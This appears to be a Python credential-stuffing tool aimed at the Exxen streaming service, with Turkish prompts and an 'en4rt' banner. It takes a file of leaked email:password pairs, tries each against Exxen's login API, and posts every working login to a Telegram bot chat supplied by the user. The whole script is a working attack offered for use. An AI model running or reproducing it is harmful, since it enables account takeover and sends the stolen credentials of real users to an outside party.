import requests
import base64
import json
import os
import time
from cfonts import render

print("\n\n")
kopmk = render('en4rt', colors=['white', 'red'], align='center')
print(kopmk)
print("━" * 55) 

token = input(" - Token Gir: ")
id = input(" - İd Gir: ")
EnartCombo = input(" - Combo gir: ")
os.system('clear')

print("\n\n")
kopmk = render('en4rt', colors=['white', 'red'], align='center')
print(kopmk)
print("━" * 55)


with open(EnartCombo, 'r') as file:
    for line in file:
        try:
            mail, pas = line.strip().split(':')
            
            enc = requests.Session()
            encode = base64.b64encode(f"{mail}:{pas}".encode()).decode()
            
            response = enc.post('https://mw-proxy.app.exxen.com/user/login', json={
                "deviceDetails": {
                    "deviceName": "Chrome",
                    "deviceType": "Desktop",
                    "modelNo": "131.0.0.0",
                    "serialNo": "131.0.0.0",
                    "brand": "Chrome",
                    "os": "Windows",
                    "osVersion": "10"
                }
            }, headers={
                'Authorization': f'Basic {encode}',
                'Content-Type': 'application/json'
            })
            
            if response.status_code == 200:
                print(f"Başarılı giriş ✅ {mail}:{pas}")
                print("━" * 55)
                mesaj = f"- Exxen Başarılı Giriş -\n📧Mail: {mail}\n🔑Password: {pas}"
                gonder = f"https://api.telegram.org/bot{token}/sendMessage"
                msj = {
                    "chat_id": id,
                    "text": mesaj
                }
                requests.post(gonder, data=msj)
            else:
                print(f"Başarısız giriş ❌ {mail}:{pas}")
                print("━" * 55)
        
        except Exception as e:
        	print("hata")

        time.sleep(2)